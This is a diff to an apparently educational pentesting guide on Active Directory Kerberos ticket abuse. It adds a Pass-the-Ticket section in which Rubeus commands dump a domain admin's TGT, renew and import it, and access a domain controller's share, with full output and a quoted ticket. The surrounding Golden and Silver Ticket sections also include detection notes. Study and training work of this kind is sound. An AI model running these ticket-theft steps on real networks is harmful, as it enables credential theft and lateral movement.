@@ -2013,13 +2013,15 @@ C:\>hostname
 DC01
 ```
 
-## Golden Ticket
+## Ticket Abuse
+
+### Golden Ticket
 
 The Golden Ticket attack enables attackers to forge and sign TGTs using the `krbtgt` account's password hash. When these tickets get presented to an AD server, the information within them will not be checked at all and will be considered valied due to being signed with `krbtgt` account's hash. For example, it is possible to sign a ticket for a user that does not exist, such as `DoesNotExist`, have the ticket also say they are Domain Administrator, and request a TGS ticket which enables them to access remote machines. For stealth reasons, it is almost always better to utilize users that exist in the domain. However, putting fake information in the ticket can be a great way to the impact and the lack of monitoring an organization has around these events.
 
 One of the scariest things about the Golden Ticket is how often pentesters will gain access to this key; when performing `DCSYNC` or `SecretsDump`, the key is KRBTGT's NTLM hash. This account is special because changing its password has to be done twice and cannot be done in rapid succession. The AD forest must reach full convergence, meaning the change has to replicate across the entire domain before it can be changed again. This is because this key is used for DCs to authenticate with each other. It should happen within 10 hours, but organizations typically wait 24 hours to minimize the chance of any issue. Within that time Window, if the attacker notices it changed and they grab it again, the process will have to repeated.
 
-### Theory
+#### Theory
 
 Following the TGT request, the DC sends the user back their TGT. The TGT is a piece of data that contains information about the user. All this information is contained in the PAC (_Privilege Attribute Certificate_).
 
@@ -2035,7 +2037,7 @@ Forging a Golden Ticket is an excellent technique to maintain persistence within
 
 Using a "Pass the Ticket" attack, you can import the golden ticket to the current session to use tools in the context of the impersonated account. As an attacker, you can forge a ticket to impersonate a sensitive user, who, although privileged in access, may not be a member of heavily monitored groups, such as Domain Admins and Enterprise Admins.
 
-### Windows
+#### Windows
 
 Different elements are needed to forge a Golden Ticket:
 
@@ -2178,7 +2180,7 @@ Cached Tickets: (2)
         Kdc Called: DC01
 ```
 
-### Linux
+#### Linux
 
 On the Linux side, `impacket` can be used to craft a Golden Ticket. [lookupsid.py](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py) will help you retrieve the domain SID and every group and user SID.
 
@@ -2244,7 +2246,7 @@ C:\Windows\system32>whoami
 nt authority\system
 ```
 
-### Detection
+#### Detection
 
 This type of persistence is challenging to detect because Golden Tickets are valid TGTs. Windows event logs don't distinguish between a legitimate TGT and a maliciously crafted Golden Ticket. Also, resetting the impersonated account's password does not invalidate the ticket.
 
@@ -2257,11 +2259,11 @@ Golden tickets can be detected in a few ways:
 
 Once a golden ticket is detected, the `krbtgt` account password must be changed twice to remove the persistence, as the current and previous passwords are stored in the domain. The password of the `krbtgt` account should be changed regularly, as it is an admin account.
 
-## Silver Ticket
+### Silver Ticket
 
 Every machine account has an NTLM hash; this is the hash of the computer, represented as the `SYSTEM$` account. This is the PSK between the Domain and Workstation which is used to sign TGS Kerberos tickets. This ticket is less powerful than the TGT, as it can only access that single machine. However, when creating a TGT, the attacker needs to approach the DC to have it generate a TGS ticker before they can access any machines. This creates a unique audit record, which doesn't stand out as malicious, but heuristics can be applied to identify if it is abnormal. When forging a TGS ticket, the attacker can bypass the DC and go straight to the target, minimizing the number of logs left behind.
 
-### Theory
+#### Theory
 
 When a user requests a TGS ticket, they send their TGT to the DC. The DC will find out which account exposes the SPN requested by the user. Then it will copy the user's information into the TGS ticket, which it will then encrypt with the secret of the service account associated with the SPN.
 
@@ -2273,7 +2275,7 @@ To forge a Silver Ticket, an attacker requires the NTLM password's hash or keys 
 
 The ticket can be forged using `Mimikatz` or `impacket` and the get injected into memory to access a target service remotely. A Silver Ticket is a forged TGS ticket, so using one does not require communication with the DC. Any associated event logs are created on the target host. Therefore, Silver Tickets are more stealthy than Golden Tickets.
 
-### Windows
+#### Windows
 
 Different elements are needed to forge a Silver Ticket. First, you need the domain's SID. This piece of information can be retrieved using PowerView's `Get-DomainSID` function.
 
@@ -2452,7 +2454,7 @@ C:\Windows\system32>hostname
 SQL01
 ```
 
-### Linux
+#### Linux
 
 On Linux, `impacket` can be used to craft a Silver Ticket. The tool [lookupsid.py](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py) will retrieve the domain's, groups', and users' SID.
 
@@ -2556,7 +2558,7 @@ C:\Windows\system32>whoami
 nt authority\system
 ```
 
-### Detection
+#### Detection
 
 Silver Tickets are more limited when compared to Golden Tickets because their scope is only for the service that is being targeted on a specific host. However, they can be utilized to remain stealthier. Silver Tickets can be used for persistence when used to access computer-hosted services. Since computer account password rotation may be disabled, and AD does not prevent computer accounts from accessing resources, this type of Silver Ticket could likely be used for a very long time.
 
@@ -2564,4 +2566,247 @@ Silver Tickets forged with Mimikatz can be detected in a few ways:
 
 - The account DOMAIN field is blank.
 - The account DOMAIN field contains DOMAIN FQDN instead of just domain.
+
+### Pass The Ticket
+
+The Pass the Ticket (_PtT_) attack is a method of lateral movement without touching LSASS. This has become incredibly important due to protections put around the LSASS Process. In a hardened organization, the contents of LSASS my not be all that valuable, and just peeking into the process will likely alert the defenders. PtT takes the user's TGT or TGS Ticket. The TGT is a signed ticket that contains a list of privilege level.s This TGT is passed to the DC, which will grant the TGS Ticket that can be used to access machines. Stealing either of these tickets makes it possible to perform lateral movement.
+
+#### Sacrificial Processes
+
+This is the most crucial concept to understand regarding Kerberos Attacks, as failure to create a Sacrificial Process can result in taking a service down. This is because it is very easy to overwrite an existing Logon Sessions Kerberos Ticket. If the local machine account loses its Kerberos ticket, it will likely not get another one until a reboot. If a service loses its ticket, it won't get a new one until the service restarts or sometimes a machine reboot.
+
+A sacrificial process creates a new Logon Session and passes tickets to that session. This does require administrative rights to the machine and will create additional IoCs that could be alerted upon. However, causing an outage during an engagement is much worse than getting caught due to safely doing things.
+
+The Rubeus action [createonly](https://github.com/GhostPack/Rubeus#createnetonly) creates a sacrificial process, and the future commands will use the `/LUID:0xdeadbeef` to interact with it.
+
+```powershell
+PS C:\Tools> .\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.2
+
+
+[*] Action: Create Process (/net only)
+
+
+[*] Using random username and password.
+
+[*] Showing process : True
+[*] Username        : Y1XGWQUL
+[*] Domain          : HT3J3C08
+[*] Password        : 967IB2AL
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 4288
+[+] LUID            : 0xa4a39
+```
+
+To authenticate to remote services with this ticket, you need to inject into the ProcessID, because you are not using a command and control, you used the option `/show`, which shows the process you just created. It will not show the process if you don't specify `/show`.
+
+#### Reading Tickets
+
+You can check all the tickets you can read and extract using the [triage](https://github.com/GhostPack/Rubeus#triage) action in Rubeus.
+
+```powershell
+PS C:\Tools> .\Rubeus.exe triage
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.2
+
+
+Action: Triage Kerberos Tickets (All Users)
+
+[*] Current LUID    : 0x892730
+
+ -----------------------------------------------------------------------------------------------------------------------
+ | LUID     | UserName                     | Service                                           | EndTime               |
+ -----------------------------------------------------------------------------------------------------------------------
+ | 0x17168  | SQL01$ @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 8/24/2020 1:38:16 PM  |
+ | 0x17168  | SQL01$ @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 8/23/2020 8:23:24 AM  |
+ | 0x3e4    | sql01$ @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 8/24/2020 12:53:21 PM |
+ | 0x3e4    | sql01$ @ INLANEFREIGHT.LOCAL | ldap/dc01.inlanefreight.local/INLANEFREIGHT.LOCAL | 8/24/2020 12:53:21 PM |
+ | 0x3e4    | sql01$ @ INLANEFREIGHT.LOCAL | GC/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL   | 8/24/2020 12:53:21 PM |
+ | 0x3e4    | sql01$ @ INLANEFREIGHT.LOCAL | cifs/DC01.INLANEFREIGHT.LOCAL                     | 8/24/2020 12:53:21 PM |
+ | 0x89275d | pixis @ INLANEFREIGHT.LOCAL  | krbtgt/INLANEFREIGHT.LOCAL                        | 8/24/2020 7:44:20 PM  |
+ | 0x89275d | pixis @ INLANEFREIGHT.LOCAL  | cifs/dc01                                         | 8/24/2020 7:44:20 PM  |
+ | 0x3e7    | sql01$ @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 8/24/2020 1:37:30 PM  |
+ | 0x3e7    | sql01$ @ INLANEFREIGHT.LOCAL | cifs/DC01                                         | 8/24/2020 1:37:30 PM  |
+ | 0x3e7    | sql01$ @ INLANEFREIGHT.LOCAL | cifs/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 8/24/2020 1:37:30 PM  |
+ | 0x3e7    | sql01$ @ INLANEFREIGHT.LOCAL | SQL01$                                            | 8/24/2020 1:37:30 PM  |
+ | 0x3e7    | sql01$ @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 8/24/2020 1:37:30 PM  |
+ | 0x3e7    | sql01$ @ INLANEFREIGHT.LOCAL | ldap/dc01.inlanefreight.local                     | 8/24/2020 1:37:30 PM  |
+ | 0x3e7    | sql01$ @ INLANEFREIGHT.LOCAL | ldap/DC02.LOGISTICS.INLANEFREIGHT.LOCAL           | 8/23/2020 8:23:20 AM  |
+```
+
+Your current LUID is `0x892730`, but no tickets are associated with your session. You can use `klist` to make sure of this.
+
+```powershell
+PS C:\Tools> klist
+
+Current LogonId is 0:0x892730
+
+Cached Tickets: (0)
+```
+
+Using Rubeus, you can extract the TGT of `pixis`. It's the ticket for `pixis@INLANEFREIGHT.LOCAL`, and with the `krbtgt/INLANEFREIGHT.LOCAL` service.
+
+```powershell
+PS C:\Tools> .\Rubeus.exe dump /luid:0x89275d /service:krbtgt /nowrap
+
+  ______        _
+ (_____ \      | |
+  _____) )_   _| |__  _____ _   _  ___
+ |  __  /| | | |  _ \| ___ | | | |/___)
+ | |  \ \| |_| | |_) ) ____| |_| |___ |
+ |_|   |_|____/|____/|_____)____/(___/
+
+ v2.2.2
+
+
+Action: Dump Kerberos Ticket Data (All Users)
+
+[*] Target service  : krbtgt
+[*] Target LUID     : 0x89275d
+[*] Current LUID    : 0x892730
+
+ Username                 : pixis
+ Domain                   : INLANEFREIGHT
+ LogonId                  : 0x89275d
+ UserSID                  : S-1-5-21-2974783224-3764228556-2640795941-2123
+ AuthenticationPackage    : Negotiate
+ LogonType                : RemoteInteractive
+ LogonTime                : 8/24/2020 9:43:48 AM
+ LogonServer              : DC01
+ LogonServerDNSDomain     : INLANEFREIGHT.LOCAL
+ UserPrincipalName        : pixis@INLANEFREIGHT.LOCAL
+
+
+   ServiceName           :  krbtgt/INLANEFREIGHT.LOCAL
+   ServiceRealm          :  INLANEFREIGHT.LOCAL
+   UserName              :  pixis
+   UserRealm             :  INLANEFREIGHT.LOCAL
+   StartTime             :  8/24/2020 9:44:20 AM
+   EndTime               :  8/24/2020 7:44:20 PM
+   RenewTill             :  8/31/2020 9:44:20 AM
+   Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+   KeyType               :  aes256_cts_hmac_sha1
+   Base64(key)           :  TzjL1PVv40EmE/AwhpjXSIjMDkQnymOrusUAVvtGsYA=
+   Base64EncodedTicket   :
+
+     doIGSzCCBkegAwIBBaEDAgEWooIFMzCCBS9hggUrMIIFJ6ADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggTdMIIE2aADAgESoQMCAQKiggTLBIIEx07UF/WIqYSqAExzUjlz/Ybkc9DqSQMptQ9JV+0q2F9UBJ7sO6TD06qbUDKoQXyMbH/zaWWqGOdP+35hah9HMVApilMjiLiRINensH8lzvcHdT/GrnrS330vDadCsYZIS0nQhXqz4PaPTjwNe7+aoY3W7DbUV1E9xvrjlGLq/IO/5HqdG3zV0wcT+V8itav7DnEPpZlygkctKX8h1pTdjqJqwKsL/DCXocVlZWgSp4y8ipg4osmXuehYF237JTFcgJHeTqMIqWbN1AeHyiDhSBmQzX72JoEN24pvIe628wJ7uqcWjpxHlsdNCHSJBwe4/O2kOqlum/Hc+oa20UTdbG8aQuWLVH0S92qpf2aiMJyANIS+a+fxvzrlzIX99saLKa9O2qzTj7/6sJ/7VoemMfy6Vef0iFv7mWEbmfvVUPeMDN4t++bl/Pdud2AxdreMpC3c2ml1bxgFjfit2KlnQph6goeNrA2hfZ3YNoplpR5TokfMXNjSiP7jlytmIPX9jDczP/F+NNyTo2TF+YrKIK+OuUBZZLmLtn21hfcUq3P9lYKIKShqsdzI3qPteAa7l6+vY7KNABFNdgBvLQjaLuLkHx32JHDOPFk0H0zP0DZR3D428mOnT8c7nV6Rk13OnCxkcKlxO41oxJ3Q2+3pjcvHpOvxL+R8vjlYmBVKrFUXlWRDmKe9hxKPzUmEmXn/rk9Zuq6Bj+7fPwMScKt1gobNX0W1i7L7KyZ9FOOAlFlg7Y3WY1yKco5rrpj/lACUo9Gbvz41YUB0OAxzKWbxnZdH1tRe0RAqY9wTJFidLgTSfX2r040y75287OAgDJhVBNHb/PsLpms3kY1Ps7KZpyg6ACBW878lxI/wLciMSXy2G9gQK8dvjB2HLgmCfIXkrKD5LU6VuygoW6wjgsfLEOaI89JTwFOVVdNlvHEj1euffx+simhC1FVFXLJvuq89psRyoFKXDiK/gs9fJcfHlVh0+4ZG7KcB9npqoYrjeoO9QDLFCfVo0HeRgpwjZ1wBckOoabNUTwvrJHP+uiDKafMjGA5SGwjOeFfxyTFqI0nP6vkNyBj0kO/IeY8nbIwfY+5pvPUJUFvRLpf/wPn8o0tJ5OLbTupU/OoPdUaozO+jVjKloWwaIJfHFYEitARjU3+FVrz+H8BYOS2hZJUKyKQnGiLY6nvre8BKNQfJxzPfZ4zN1VVo5YZz0pipMg8Xwe7YHQWJiNm1LbQUCWItn95BgP8ueH58gRA5JKLKFxWmpX7kU16kNOq5k/O<SNIP>
+```
+
+You can then use Rubeus to ask for a new valid TGT using the one you just extracted with the following little trick: You will utilize the renewal functionality of Kerberos by providing your TGT, and you'll receive a brand new one for the same user.
+
+```
+C:\Tools> Rubeus.exe renew /ticket:doIFVjCCBVKgAwIBBaEDA<SNIP> /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.2
+
+[*] Action: Renew Ticket
+
+[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (10.129.1.207)
+[*] Building TGS-REQ renewal for: 'INLANEFREIGHT.LOCAL\pixis'
+[+] TGT renewal request successful!
+[*] base64(ticket.kirbi):
+
+      doIFVjCCBVKgAwIBBaEDAgEWooIESTCCBEVhggRBMIIEPaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D<SNIP>
+
+[+] Ticket successfully imported!
+```
+
+Rerun `klist` to confirm that the ticket for the target user is now in your current session.
+
+```
+C:\Tools> klist
+
+Current LogonId is 0:0x892730
+
+Cached Tickets: (1)
+
+#0>     Client: pixis @ INLANEFREIGHT.LOCAL
+        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 8/24/2020 9:51:02 (local)
+        End Time:   8/24/2020 19:51:02 (local)
+        Renew Time: 8/31/2020 9:44:20 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+```
+
+Now that you have this TGT in memory, you can perform any action on behalf of the impersonated user `pixis`. For example, you can read a DC's file system because `pixis` is a domain admin.
+
+```
+C:\Tools> dir \\dc01\\c$
+
+    Directory: \\dc01\c$
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        7/27/2020   5:56 PM                Department Shares
+d-----        7/16/2016   6:23 AM                PerfLogs
+d-r---        8/22/2020  10:52 PM                Program Files
+d-----        7/27/2020  12:14 PM                Program Files (x86)
+d-----        7/27/2020   7:37 PM                Software
+d-----        8/23/2020   6:54 PM                Tools
+d-r---        7/30/2020  11:49 AM                Users
+d-----        8/17/2020  12:29 PM                Windows
+```
+
+Under the hood, Windows used your TGT to request a TGS ticket for the following SPN `cifs/dc01`.
+
+```
+C:\Tools> klist
+
+Current LogonId is 0:0x892730
+
+Cached Tickets: (2)
+
+#0>     Client: pixis @ INLANEFREIGHT.LOCAL
+        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 8/24/2020 9:51:02 (local)
+        End Time:   8/24/2020 19:51:02 (local)
+        Renew Time: 8/31/2020 9:44:20 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+
+#1>     Client: pixis @ INLANEFREIGHT.LOCAL
+        Server: cifs/dc01 @ INLANEFREIGHT.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+        Start Time: 8/24/2020 9:58:50 (local)
+        End Time:   8/24/2020 19:51:02 (local)
+        Renew Time: 8/31/2020 9:44:20 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called: DC01.INLANEFREIGHT.LOCAL
+```
+
+#### Sacrificial Process - Without Administrative Rights
+
+The reason why Rubeus needs administrative rights is to interact with the `NetOnly` process it spawns to create the Logon Session. When using a proper C2 Framework, the stdin/stdout of the process is generally mapped to named pipes. This enables the framework to interact with processes it spawns without administrative privileges. If using Covenant or Cobalt Strike, try using the `maketoken` feature to create your Logon Session instead of using Rubeu's `NetOnly` option.
 
